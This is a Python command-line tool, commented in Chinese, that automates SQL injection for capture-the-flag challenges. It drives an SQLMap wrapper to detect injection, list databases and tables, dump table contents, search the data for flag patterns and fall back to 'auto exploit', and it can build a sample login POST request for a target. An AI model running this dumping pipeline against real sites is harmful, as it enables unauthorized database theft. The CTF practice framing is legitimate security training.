#!/usr/bin/env python3
"""
增强版CTF解题脚本
专门针对实际CTF挑战，支持完整的SQL注入利用流程
"""

import asyncio
import argparse
import sys
import json
import tempfile
import os
from pathlib import Path
from datetime import datetime

# 添加项目根目录到Python路径
sys.path.insert(0, str(Path(__file__).parent))

from src.utils.logger import setup_logger
from src.mcp_server.tools.sqlmap_wrapper import SQLMapWrapper


class EnhancedCTFSolver:
    """增强版CTF解题器"""
    
    def __init__(self, verbose=False):
        self.logger = setup_logger("enhanced_ctf_solver", log_level="DEBUG" if verbose else "INFO")
        self.verbose = verbose
        self.sqlmap_wrapper = SQLMapWrapper()
        self.results = {
            "solver_version": "2.0.0",
            "start_time": None,
            "end_time": None,
            "target": None,
            "challenge_type": None,
            "flags_found": [],
            "vulnerabilities": [],
            "tools_used": [],
            "phases_completed": [],
            "success": False,
            "detailed_steps": []
        }
    
    async def initialize(self):
        """初始化解题器"""
        self.logger.info("初始化增强版CTF解题器...")
        
        # 测试SQLMap连接
        connected = await self.sqlmap_wrapper.test_connection()
        if not connected:
            self.logger.error("SQLMap连接测试失败")
            return False
        
        self.logger.info("解题器初始化完成")
        return True
    
    async def solve_sqli_with_request_file(self, target_url, request_file_path=None, create_request_file=False):
        """
        使用请求文件解决SQL注入挑战
        
        Args:
            target_url: 目标URL
            request_file_path: 请求文件路径（如果为None且create_request_file=True，则自动创建）
            create_request_file: 是否自动创建请求文件
        """
        self.results["start_time"] = datetime.now().isoformat()
        self.results["target"] = target_url
        self.results["challenge_type"] = "sql-injection"
        
        self.logger.info(f"开始解决SQL注入挑战: {target_url}")
        
        try:
            # 步骤1: 创建请求文件（如果需要）
            if create_request_file and not request_file_path:
                request_file_path = await self._create_request_file(target_url)
                self.logger.info(f"已创建请求文件: {request_file_path}")
            
            # 步骤2: 使用请求文件进行扫描
            if request_file_path and os.path.exists(request_file_path):
                self.logger.info("步骤1: 使用请求文件进行SQL注入扫描...")
                step1_result = await self._scan_with_request_file(request_file_path)
                self.results["detailed_steps"].append({
                    "step": "request_file_scan",
                    "result": step1_result
                })
                
                if step1_result.get("success") and step1_result.get("vulnerabilities"):
                    self.logger.info("✅ 发现SQL注入漏洞")
                    self.results["vulnerabilities"].extend(step1_result["vulnerabilities"])
                    self.results["phases_completed"].append("vulnerability_detection")
                else:
                    self.logger.warning("未发现SQL注入漏洞，尝试直接扫描...")
                    # 尝试直接扫描
                    direct_scan_result = await self.sqlmap_wrapper.scan(target_url)
                    self.results["detailed_steps"].append({
                        "step": "direct_scan",
                        "result": direct_scan_result
                    })
                    
                    if direct_scan_result.get("success") and direct_scan_result.get("vulnerabilities"):
                        self.results["vulnerabilities"].extend(direct_scan_result["vulnerabilities"])
                        self.results["phases_completed"].append("vulnerability_detection")
            else:
                # 直接扫描
                self.logger.info("步骤1: 直接进行SQL注入扫描...")
                direct_scan_result = await self.sqlmap_wrapper.scan(target_url)
                self.results["detailed_steps"].append({
                    "step": "direct_scan",
                    "result": direct_scan_result
                })
                
                if direct_scan_result.get("success") and direct_scan_result.get("vulnerabilities"):
                    self.results["vulnerabilities"].extend(direct_scan_result["vulnerabilities"])
                    self.results["phases_completed"].append("vulnerability_detection")
            
            # 步骤3: 获取数据库列表
            self.logger.info("步骤2: 获取数据库列表...")
            databases = await self.sqlmap_wrapper.get_dbs(target_url)
            
            step2_result = {
                "success": len(databases) > 0,
                "databases": databases
            }
            self.results["detailed_steps"].append({
                "step": "get_databases",
                "result": step2_result
            })
            
            if databases:
                self.logger.info(f"发现数据库: {databases}")
                self.results["phases_completed"].append("database_enumeration")
                
                # 过滤掉系统数据库
                target_dbs = [db for db in databases if "information_schema" not in db.lower() 
                             and "mysql" not in db.lower() and "performance_schema" not in db.lower()]
                
                if not target_dbs:
                    target_dbs = databases  # 如果没有非系统数据库，使用所有数据库
                
                # 步骤4: 对每个目标数据库获取表
                for db in target_dbs:
                    self.logger.info(f"步骤3: 获取数据库 '{db}' 的表列表...")
                    tables = await self.sqlmap_wrapper.get_tables(target_url, db)
                    
                    step3_result = {
                        "database": db,
                        "success": len(tables) > 0,
                        "tables": tables
                    }
                    self.results["detailed_steps"].append({
                        "step": f"get_tables_{db}",
                        "result": step3_result
                    })
                    
                    if tables:
                        self.logger.info(f"数据库 '{db}' 中的表: {tables}")
                        self.results["phases_completed"].append("table_enumeration")
                        
                        # 优先检查可能包含flag的表
                        flag_tables = [t for t in tables if "flag" in t.lower() or "l0ve1ysq1" in t.lower()]
                        if not flag_tables:
                            flag_tables = tables  # 如果没有明显的flag表，检查所有表
                        
                        # 步骤5: 转储表数据
                        for table in flag_tables:
                            self.logger.info(f"步骤4: 转储表 '{db}.{table}' 的数据...")
                            dump_result = await self.sqlmap_wrapper.dump_table(target_url, db, table)
                            
                            step4_result = {
                                "database": db,
                                "table": table,
                                "success": dump_result.get("success", False),
                                "data_count": len(dump_result.get("data", [])),
                                "flag_found": dump_result.get("flag")
                            }
                            self.results["detailed_steps"].append({
                                "step": f"dump_table_{db}_{table}",
                                "result": step4_result
                            })
                            
                            if dump_result.get("success"):
                                self.results["phases_completed"].append("data_extraction")
                                
                                # 检查是否找到flag
                                if dump_result.get("flag"):
                                    flag = dump_result["flag"]
                                    self.logger.info(f"🎉 找到Flag: {flag}")
                                    self.results["flags_found"].append(flag)
                                    self.results["success"] = True
                                    break
                                
                                # 检查数据中是否包含flag
                                data = dump_result.get("data", [])
                                for record in data:
                                    for key, value in record.items():
                                        if isinstance(value, str):
                                            flag_patterns = [
                                                r'flag\{[^}]+\}',
                                                r'FLAG\{[^}]+\}',
                                                r'ctf\{[^}]+\}',
                                                r'CTF\{[^}]+\}',
                                                r'[A-Za-z0-9]{32}',
                                                r'[A-Za-z0-9]{64}',
                                            ]
                                            for pattern in flag_patterns:
                                                import re
                                                match = re.search(pattern, value)
                                                if match:
                                                    flag = match.group()
                                                    self.logger.info(f"🎉 在数据中找到Flag: {flag}")
                                                    self.results["flags_found"].append(flag)
                                                    self.results["success"] = True
                                                    break
                                        
                                    if self.results["success"]:
                                        break
                            
                            if self.results["success"]:
                                break
                    
                    if self.results["success"]:
                        break
            
            # 如果没有找到flag，尝试自动利用
            if not self.results["success"] and self.results["vulnerabilities"]:
                self.logger.info("步骤5: 尝试自动利用...")
                auto_exploit_result = await self.sqlmap_wrapper.auto_exploit(target_url)
                
                self.results["detailed_steps"].append({
                    "step": "auto_exploit",
                    "result": auto_exploit_result
                })
                
                if auto_exploit_result.get("success"):
                    self.results["phases_completed"].append("auto_exploitation")
                    
                    if auto_exploit_result.get("flag"):
                        flag = auto_exploit_result["flag"]
                        self.logger.info(f"🎉 通过自动利用找到Flag: {flag}")
                        self.results["flags_found"].append(flag)
                        self.results["success"] = True
                    elif auto_exploit_result.get("data"):
                        self.logger.info("成功获取数据但未找到明确flag格式")
                        self.results["success"] = True  # 部分成功
            
            # 更新工具使用列表
            self.results["tools_used"] = ["sqlmap"]
            
            # 生成报告
            await self._generate_report()
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"解题过程中出现错误: {e}")
            import traceback
            self.logger.error(traceback.format_exc())
            self.results["error"] = str(e)
            return self.results
        finally:
            self.results["end_time"] = datetime.now().isoformat()
    
    async def _scan_with_request_file(self, request_file_path):
        """使用请求文件进行扫描"""
        return await self.sqlmap_wrapper.scan_with_request_file(request_file_path)
    
    async def _create_request_file(self, target_url):
        """
        创建请求文件
        注意：这是一个简化版本，实际使用时需要根据具体挑战调整
        """
        # 创建临时文件
        import tempfile
        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
        
        # 基本的HTTP请求模板
        # 实际使用时需要根据具体挑战调整
        request_content = f"""POST /check.php HTTP/1.1
Host: {target_url.replace('http://', '').replace('https://', '')}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&password=test
"""
        
        temp_file.write(request_content)
        temp_file.close()
        
        return temp_file.name
    
    async def _generate_report(self):
        """生成解题报告"""
        self.logger.info("生成解题报告...")
        
        # 计算耗时
        if self.results["start_time"] and self.results["end_time"]:
            start = datetime.fromisoformat(self.results["start_time"])
            end = datetime.fromisoformat(self.results["end_time"])
            self.results["duration"] = str(end - start)
        
        # 创建报告目录
        reports_dir = Path("reports")
        reports_dir.mkdir(exist_ok=True)
        
        # 生成文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = self.results["target"].replace("://", "_").replace("/", "_").replace(":", "_")
        report_file = reports_dir / f"enhanced_ctf_solve_{target_safe}_{timestamp}.json"
        
        # 保存JSON报告
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"报告已保存: {report_file}")
        
        # 打印摘要
        self._print_summary()
        
        return str(report_file)
    
    def _print_summary(self):
        """打印解题摘要"""
        print("\n" + "="*70)
        print("增强版CTF解题完成摘要")
        print("="*70)
        print(f"目标: {self.results['target']}")
        print(f"挑战类型: {self.results.get('challenge_type', 'unknown')}")
        
        if 'duration' in self.results:
            print(f"耗时: {self.results['duration']}")
        
        print(f"完成阶段: {len(self.results.get('phases_completed', []))}")
        print(f"使用工具: {', '.join(set(self.results.get('tools_used', [])))}")
        print(f"发现漏洞: {len(self.results.get('vulnerabilities', []))}")
        print(f"找到Flag: {len(self.results.get('flags_found', []))}")
        
        if self.results.get('flags_found'):
            print("\n🎉 发现的Flag:")
            for flag in self.results['flags_found']:
                print(f"  {flag}")
        
        print(f"\n成功: {'✅ 是' if self.results.get('success') else '❌ 否'}")
        
        # 打印详细步骤摘要
        print("\n详细步骤:")
        for i, step in enumerate(self.results.get('detailed_steps', []), 1):
            step_name = step.get('step', f'step_{i}')
            result = step.get('result', {})
            success = result.get('success', False)
            print(f"  {i}. {step_name}: {'✅' if success else '❌'}")
        
        print("="*70)


async def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="增强版CTF解题脚本")
    parser.add_argument("target", help="目标URL")
    parser.add_argument("-r", "--request-file", help="请求文件路径（包含HTTP请求）")
    parser.add_argument("-c", "--create-request", action="store_true", 
                       help="自动创建请求文件（如果未提供请求文件）")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("-t", "--timeout", type=int, default=600, 
                       help="超时时间（秒，默认10分钟）")
    
    args = parser.parse_args()
    
    # 创建解题器
    solver = EnhancedCTFSolver(verbose=args.verbose)
    
    try:
        # 初始化
        success = await solver.initialize()
        if not success:
            print("❌ 解题器初始化失败")
            return 1
        
        # 解决挑战
        results = await solver.solve_sqli_with_request_file(
            target_url=args.target,
            request_file_path=args.request_file,
            create_request_file=args.create_request
        )
        
        # 根据结果返回退出码
        if results.get("success"):
            print("\n✅ 解题成功！")
            return 0
        else:
            print("\n⚠️  解题未完全成功")
            return 1
            
    except KeyboardInterrupt:
        print("\n\n解题被用户中断")
        return 130
    except Exception as e:
        print(f"\n❌ 解题失败: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)